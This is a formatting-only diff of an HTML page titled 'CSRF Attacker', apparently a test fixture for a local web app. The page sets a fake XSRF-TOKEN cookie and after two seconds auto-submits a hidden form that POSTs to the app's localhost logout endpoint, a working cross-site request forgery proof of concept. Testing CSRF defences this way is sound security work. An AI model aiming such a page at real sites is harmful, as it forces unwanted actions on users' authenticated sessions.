@@ -1,19 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CSRF Attacker</title>
-</head>
-<body>
-<h1>You have been attacked!</h1>
-<form id="csrf-form" method="POST"
-      action="http://localhost:4200/api/auth/logout">
-</form>
-<script>
-  document.cookie = 'XSRF-TOKEN=12233';
-  setTimeout(function () {
-    document.getElementById('csrf-form').submit();
-  }, 2000);
-</script>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSRF Attacker</title>
+  </head>
+  <body>
+    <h1>You have been attacked!</h1>
+    <form
+      id="csrf-form"
+      method="POST"
+      action="http://localhost:4200/api/auth/logout"
+    ></form>
+    <script>
+      document.cookie = 'XSRF-TOKEN=12233';
+      setTimeout(function () {
+        document.getElementById('csrf-form').submit();
+      }, 2000);
+    </script>
+  </body>
 </html>
